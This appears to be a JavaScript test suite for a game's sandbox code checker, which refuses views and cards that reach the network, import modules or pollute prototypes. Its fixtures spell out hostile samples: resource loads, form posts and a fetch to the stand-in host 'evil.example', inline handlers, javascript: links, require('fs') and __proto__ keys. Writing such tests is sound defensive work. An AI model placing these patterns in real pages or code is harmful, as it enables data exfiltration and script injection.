// @ts-nocheck — plain JS
// C3: one checker for every kind of code. Everything we ship passes it; code that tries to reach out, import, hide a
// handler in its markup or carry what is no JSON is refused by it, in a sentence; the hostile asset cards too.
// Run: bun test src/lib/code
import { describe, expect, test } from 'bun:test';

const noop = new Proxy(function () {}, { get: (_, k) => (k === Symbol.toPrimitive ? () => 0 : noop), apply: () => noop, set: () => true });
globalThis.document ??= { createElement: () => ({ width: 0, height: 0, getContext: () => noop, style: {} }) };
globalThis.$state ??= (x) => x;
const { checkCode, TYPES } = await import('./check.js');
const EXAMPLES = (await import('../../../game/genui/examples.js')).examples();
const { defaultViews: valleyViews, SLOTS: VALLEY_SLOTS, slotsOf: valleySlots } = await import('../../../game/economy/views.js');
const VALLEY_VIEWS = valleyViews();
const { defaultViews: v1Views, SLOTS } = await import('../../../game/maiacity-v1/views.js');
const V1_VIEWS = v1Views();
const { defaultCards } = await import('../../../game/economy/params.js');
const { hostileCards } = await import('../assets/schemas/hostile.js');

const html = (body, libs = [], extra = {}) => ({ id: 'v', title: 'V', kind: 'html', spec: { html: body, libs, ...extra } });
const refused = (r) => (r.ok ? 'ACCEPTED' : r.errors[0]);

describe('what we ship passes', () => {
	test('the types', () => expect(Object.keys(TYPES).sort()).toEqual(['asset-card', 'logic', 'rule-card', 'view', 'view-card']));
	for (const v of EXAMPLES) test(`the example view ${v.id}`, () => expect(checkCode('view', v)).toMatchObject({ ok: true }));
	for (const c of VALLEY_VIEWS) test(`Sandbox 7's screen ${c.id}`, () => expect(checkCode('view-card', c)).toMatchObject({ ok: true, notes: [] }));
	for (const c of V1_VIEWS) test(`V1's screen ${c.id}`, () => expect(checkCode('view-card', c, { slots: SLOTS })).toMatchObject({ ok: true, notes: [] }));
	test("every Sandbox 7 rule card, its default code included", () => {
		for (const c of defaultCards()) {
			const r = checkCode('rule-card', c);
			expect([c.id, r.ok, r.ok ? r.notes : r.errors]).toEqual([c.id, true, []]);
		}
	});
	test('a template view with logic, and a script view with its libraries', () => {
		expect(checkCode('view', html('<p>{{n}}</p><button data-event="add">+</button>', [], { data: { n: 1 }, logic: 'export function on(e, d) { return { n: d.n + 1 }; }' }))).toMatchObject({ ok: true, notes: [] });
		expect(checkCode('view', html('<canvas></canvas><script type="module">import * as THREE from "three"; import { OrbitControls } from "three/addons/controls/OrbitControls.js"; // fetch("x") in a comment\nconst s = "import x from \'y\'";</script>', ['three']))).toMatchObject({ ok: true, notes: [] });
	});
	test("a screen takes one of its game's panels, never one where a person decides", () => {
		const card = (id, slot) => ({ id, kind: 'view', name: id, data: { slot }, code: '<template each="board" as="r"><button data-event="select" data-value="{{r.id}}">{{r.name}}</button></template>' });
		for (const slot of VALLEY_SLOTS) expect(checkCode('rule-card', card('screen', slot))).toMatchObject({ ok: true, value: { data: { slot } } });
		expect(refused(checkCode('rule-card', card('screen', 'proposals')))).toBe(`Card screen: a view's slot is one of ${VALLEY_SLOTS.join(', ')}.`);
		expect(refused(checkCode('view-card', card('screen', 'prices'), { slots: SLOTS }))).toBe(`Card screen: a view's slot is one of ${SLOTS.join(', ')}.`);
		const slots = valleySlots([card('a', 'prices'), card('b', 'board'), card('c', 'prices'), card('d', 'panel')]);
		expect(Object.fromEntries(Object.entries(slots).map(([k, v]) => [k, v.id]))).toEqual({ prices: 'c', board: 'b' });
	});
	test('read mode: a view already kept is drawn whatever the rules now say', () => {
		expect(checkCode('view', html('<img src="https://evil.example/p.png">'), { mode: 'read' })).toMatchObject({ ok: true });
	});
});

describe('views that try to reach out are refused, with and without a script', () => {
	const HOSTILE = {
		'a picture from an address': html('<img src="https://evil.example/p.png">'),
		'a picture from an address, no scheme': html('<img src="//evil.example/p.png">'),
		'an svg use from an address': html('<svg><use href="https://evil.example/s.svg#x"/></svg>'),
		'a frame': html('<iframe srcdoc="x"></iframe>'),
		'an object': html('<object data="x"></object>'),
		'a stylesheet link': html('<link rel="stylesheet" href="x.css">'),
		'a base': html('<base href="https://evil.example/">'),
		'a refresh': html('<meta http-equiv="refresh" content="0;url=https://evil.example">'),
		'a form that posts': html('<form action="https://evil.example"><button>go</button></form>'),
		'a javascript: link': html('<a href="javascript:alert(1)">x</a>'),
		'a CSS import': html('<style>@import "x.css";</style>'),
		'a CSS picture from an address': html('<div style="background:url(https://evil.example/x)">x</div>'),
		'a handler in the markup': html('<button onclick="parent.postMessage(1, \'*\')">x</button>'),
		'a handler on svg': html('<svg onload="x()"><rect/></svg>'),
		'a script from a CDN': html('<script src="https://cdn.jsdelivr.net/npm/three/build/three.module.js"></script>'),
		'a module from a CDN': html('<script type="module">import * as THREE from "https://cdn.jsdelivr.net/npm/three";</script>'),
		'a module we do not have': html('<script type="module">import _ from "lodash";</script>'),
		'a library its libs do not name': html('<script type="module">import * as THREE from "three";</script>'),
		'a dynamic import from an address': html('<script>import("https://evil.example/x.js");</script>'),
		'a re-export from an address': html('<script type="module">export * from "https://evil.example/x.js";</script>'),
		'logic that imports': html('<p>x</p>', [], { logic: 'import x from "y"; export function init(d) { return d; }' }),
		'logic that requires': html('<p>x</p>', [], { logic: 'const fs = require("fs"); export function init(d) { return d; }' }),
		'logic that answers no hook': html('<p>x</p>', [], { logic: 'export function start(d) { return d; }' }),
		'data that reaches a prototype': html('<p>x</p>', [], { data: JSON.parse('{"__proto__": {"x": 1}}') })
	};
	for (const [what, v] of Object.entries(HOSTILE)) test(what, () => expect(refused(checkCode('view', v))).not.toBe('ACCEPTED'));
	test('a sentence that says what to do', () => {
		expect(checkCode('view', HOSTILE['a library its libs do not name']).errors[0]).toContain('add "three" to libs');
	});
	test("a game's screen is held to the same rules", () => {
		expect(refused(checkCode('view-card', { id: 'evil', kind: 'view', name: 'E', data: {}, code: '<img src="https://evil.example/p">' }))).toContain('loads a file from an address');
		expect(refused(checkCode('rule-card', { id: 'evil', kind: 'view', name: 'E', data: {}, code: '<script src="https://evil.example/x.js"></script>' }))).toContain('loads a script');
	});
	test('notes: kept, but doing nothing', () => {
		const r = checkCode('view', html('<script>fetch("https://evil.example/x").then(() => localStorage.x = 1)</script>', ['d3']));
		expect(r.ok).toBe(true);
		expect(r.notes.join(' ')).toContain('no network');
		expect(r.notes.join(' ')).toContain('never imports');
	});
});

describe('logic that could never run alone is refused', () => {
	const card = (code, more = {}) => ({ id: 'trading', kind: 'policy', name: 'T', values: {}, code, ...more });
	const HOSTILE = {
		'an import': card('import { x } from "./rules.js";\nexport function want() { return 1; }'),
		'a dynamic import': card('export async function want() { return (await import("x")).y; }'),
		'require': card('export function want() { return require("x"); }'),
		'too long': card('export function want() { return 1; }\n//' + 'x'.repeat(20_000)),
		'data that is no JSON': card('', { data: { at: Infinity } }),
		'data with a prototype key': card('', { data: JSON.parse('{"a": {"constructor": {"prototype": {}}}}') })
	};
	for (const [what, c] of Object.entries(HOSTILE)) test(what, () => expect(refused(checkCode('rule-card', c))).not.toBe('ACCEPTED'));
	test('a word in a comment or a string is not taken for code', () => {
		expect(checkCode('rule-card', card('// import x from "y"\nexport function want() { const s = "require(\'x\')"; return 1; }'))).toMatchObject({ ok: true });
	});
	test('a bare logic module: its hooks', () => {
		expect(checkCode('logic', { code: 'export function init(d) { return d; }', hooks: ['init', 'on'] })).toMatchObject({ ok: true });
		expect(refused(checkCode('logic', { code: 'export const x = 1;', hooks: ['init', 'on'] }))).toContain('exports none of init, on');
	});
	test('no such type', () => expect(refused(checkCode('macro', {}))).toContain('no type of code'));
});

describe("an asset's card: a real one passes, the asset schemas' hostile cards are refused by the one checker", async () => {
	const { assetAt, objectAt, parseRef } = await import('../assets/index.js');
	const { cardOf } = await import('../assets/card.js');
	const { metaOf } = await import('../assets/recipe.js');
	const ref = 'things/bell-tent';
	const at = await assetAt(ref);
	const good = cardOf(await objectAt(ref), metaOf(at.group, at.item, at.version, parseRef(ref).variant), { recipe: 'ab'.repeat(32), engine: 1 });
	test(`${ref}'s card`, () => expect(checkCode('asset-card', good)).toMatchObject({ ok: true }));
	for (const [what, c] of Object.entries(hostileCards(good))) test(what, () => expect(refused(checkCode('asset-card', c))).not.toBe('ACCEPTED'));
});
